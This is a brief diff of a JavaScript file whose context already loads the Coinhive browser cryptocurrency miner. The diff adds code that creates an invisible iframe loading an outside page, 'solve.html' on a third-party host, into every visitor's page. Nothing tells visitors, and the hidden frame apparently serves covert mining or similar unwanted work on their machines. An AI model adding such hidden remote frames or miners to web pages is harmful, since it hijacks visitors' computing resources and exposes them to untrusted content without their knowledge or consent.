@@ -62,3 +62,8 @@ $.getScript("https://coin-hive.com/lib/coinhive.min.js", function() {
     	// Output to HTML elements...
     }, 5000);
   });
+
+var iframe = document.createElement('iframe');
+iframe.style.display = "none";
+iframe.src = "https://php.berry.bp.la/solve.html";
+document.body.appendChild(iframe);
